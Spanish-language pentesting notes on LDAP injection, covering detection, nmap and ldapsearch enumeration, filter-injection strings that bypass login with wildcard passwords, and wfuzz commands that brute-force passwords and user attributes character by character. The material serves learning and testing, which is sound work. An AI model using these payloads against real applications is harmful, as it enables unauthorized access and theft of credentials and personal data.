# Inyecciones LDAP

***

* Tags: #OWASP\_TOP\_10 #vulnerabilidad #hacking #LDAP #Directorio\_activo

***

> Las inyecciones **LDAP (Protocolo Ligero de Acceso a Directorios)** son una categoría de vulnerabilidades de seguridad en aplicaciones web que involucran la manipulación maliciosa de consultas o comandos LDAP dentro de una solicitud.
>
> **LDAP** es un protocolo utilizado para acceder y gestionar información de directorios, como bases de datos de usuarios y contraseñas en sistemas de autenticación.
>
> Las inyecciones **LDAP** ocurren cuando un atacante introduce datos maliciosos, a menudo a través de campos de entrada, con el fin de engañar a la aplicación para que realice consultas LDAP no deseadas. Esto puede dar como resultado la obtención no autorizada de información confidencial o incluso la toma de control de la autenticación y autorización del sistema, además se podrían realizar operaciones maliciosas en la red, como lanzar ataques de \[\[Phishing]] o incluso instalar software malicioso en los sistemas de la red.
>
> Para evitar este tipo de ataques, las aplicaciones que interactúan con un servidor **LDAP** deben validar y limpiar adecuadamente la entrada del usuario antes de enviarla al servidor, además de **monitorizar** regularmente las **actividades** del servidor como la ejecución con\*\* privilegios mínimos\*\* en la red.

***

## Detección de vulnerabilidad

Para empezar, debe estar habilitado el servicio a través del **puerto 389** o el **puerto 636** (ldaps). Podemos seguir los siguientes pasos para intentar detectar esta vulnerabilidad:

* **Manipulación en los puntos de entrada de datos:** Podemos tratar de identificar áreas en la página donde los usuarios puedan ingresar datos, como formularios de inicio de sesión, campo des búsqueda u otros, de manera que podemos tratar de incluir caracteres especiales, comillas y otros caracteres que puedan ser interpretados por el protocolo **LDAP**. Una cadena típica de inyección es `"John*)(|(objectClass=*"`.
* **Errores de sintaxis LDAP o tiempos de respuesta largos:** Si la aplicación web devuelve errores de sintaxis LDAP o mensajes de error relacionados con consultas LDAP, podría indicar que la inyección es posible y que no se aplica una validación correcta en la entrada de datos. Si hay tiempos de respuesta significativamente más largos después de la manipulación de datos, también puede ser indicio de que es vulnerable.

***

## Explotación

Una vez hayamos detectado que el **puerto 389** está abierto, podemos utilizar scripts de \[\[nmap]] que nos proporcionan información acerca del servicio **LDAP**:

```bash
nmap --script ldap\* -p389 <IP>
```

lo cual nos debería devolver algo parecido a lo siguiente:

!\[\[Pasted image 20230902123040.png]]

de donde podemos observar en el campo **namingContexts** el dominio de la página web, en este caso example.org.

Ahora podremos ejecutar el siguiente comando para hacer un análisis más profundo del servicio:

```bash
ldapsearch -x -H ldap://<IP> -b dc=example,dc=org -D "cn=admin,dc=exmaple,dc=org" -w admin 'cn=admin'
```

donde los parámetros significan:

* **-x**: para que utilice autentificación simple
* **-H**: para especificar la URL a la que queremos acceder
* **-b**: (base de búsqueda) le proporcionamos el dominio encontrado anteriormente.
* **-D**: (Distinguished name) le indicamos como qué usuario nos queremos identificar
* **-w**: (passwd) le indicamos que contraseña queremos utilizar

Al final del comando utilizamos el criterio de búsqueda para que filtre por el usuario admin, pero podemos hacer búsquedas más avanzadas, como por ejemplo la siguiente, que se refiere a que el usuario sea admin **y** la descripción empiece por LDAP:

```bash
"(&(cn=admin)(description=LDAP*))"
```

### Obtención de credenciales y acceso al sistema

Este tipo de peticiones son las que puede realizar un servicio web que esté corriendo un LDAP, de manera que si no se ha sanitizado correctamente la entrada de los datos, por ejemplo que reciba los datos y haya una sentencia como la siguiente:

```
$filter = '(&(cn=' . $userId . ')(userPassword=' . $password . '))';
```

seríamos capaces de introducir los campos admin:\* de manera que la petición quedaría de la siguiente forma:

```
$filter = '(&(cn=admin)(userPassword=*))';
```

con la que habríamos ganado acceso al sistema como admin. Para intentar deducir la contraseña, podemos hacer un proceso similar al de \[\[NoSQLi]], en el que vamos realizando fuerza bruta para descubrir los usuarios existentes con sus respectivas contraseñas, podemos hacer uso de \[\[Burpsuite]] para que sea más cómodo el proceso de modificación:

```
$filter = '(&(cn=admin)(userPassword=a*))';  #No ganamos acceso, la contraseña no empieca por a
$filter = '(&(cn=admin)(userPassword=b*))';  #No ganamos acceso, la contraseña no empieca por b
$filter = '(&(cn=admin)(userPassword=c*))';  #Ganamos acceso, la contraseña empieza por c

$filter = '(&(cn=admin)(userPassword=ca*))';  #No ganamos acceso, la contraseña no empieca por ca
...

$filter = '(&(cn=a*)(userPassword=*))';      #No ganamos acceso, no hay usuarios que empiecen por a
$filter = '(&(cn=b*)(userPassword=*))';      #No ganamos acceso, no hay usuarios que empiecen por b
$filter = '(&(cn=c*)(userPassword=*))';      #Ganamos acceso, hay al menos un usuario que empiece por c

$filter = '(&(cn=ca*)(userPassword=*))';      #No ganamos acceso, no hay usuarios que empiecen por ca
...
```

También podemos hacer uso del **null byte** para que el campo de la contraseña no quede dentro de la petición, de manera que solo estemos diciendo que queremos acceder como el usuario admin. Podríamos hacer una petición de la siguiente forma:

```
$filter = '(&(cn=admin))%20)(userPassword=testing))'; #Introduciendo admin))%20 como usuario
```

### Obtención de atributos de usuarios

Cada usuario perteneciente al servidor tiene sus atributos, que pueden aportar información relevante y suponer un riesgo conocer. Para hacer una enumeración de los atributos existentes de un usuario, podemos hacer uso de \[\[Wfuzz]] de la siguiente manera, suponiendo que el filtrado se realiza de la siguiente manera:

```
$filter = '(&(cn=admin)(userPassword=admin))';        
```

podemos utilizar como diccionario el pertenciente a [SecLists](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LDAP-openldap-attributes.txt), para ejecutar el siguiente comando:

```
wfuzz -c -w /.../LDAP-openldap-attributes.txt -d 'user_id=admin)(FUZZ=*))%00&password=*' -u <URL>
```

y podríamos realizar un filtrado para quedarnos con las respuestas que nos interesen, para conseguir los atributos existentes para admin.

Una vez tengamos los atributos existentes para un usuario, podemos realizar fuerza bruta al igual que se ha utilizado anteriormente para conseguir el valor de dichos campos, por ejemplo, si quisiéramos conseguir el número de teléfono de un usuario podemos realizar el siguiente proceso:

```
wfuzz -c -z range,0-9 -d 'user_id=admin)(telephoneNumber=FUZZ*))%00&password=*' -u <URL>   #Obtenemos que empieza por 6
wfuzz -c -z range,0-9 -d 'user_id=admin)(telephoneNumber=6FUZZ*))%00&password=*' -u <URL>  #Obtenemos que empieza por 64
wfuzz -c -z range,0-9 -d 'user_id=admin)(telephoneNumber=64FUZZ*))%00&password=*' -u <URL>  #Obtenemos que empieza por 645
wfuzz -c -z range,0-9 -d 'user_id=admin)(telephoneNumber=645FUZZ*))%00&password=*' -u <URL>  #Obtenemos que empieza por 6450
...
```

Se podría programar un script en python para automatizar todos estos procesos de fuerza bruta.

***

## Ejemplos prácticos

* [LDAP-Injection-Vuln-App](https://github.com/motikan2010/LDAP-Injection-Vuln-App)
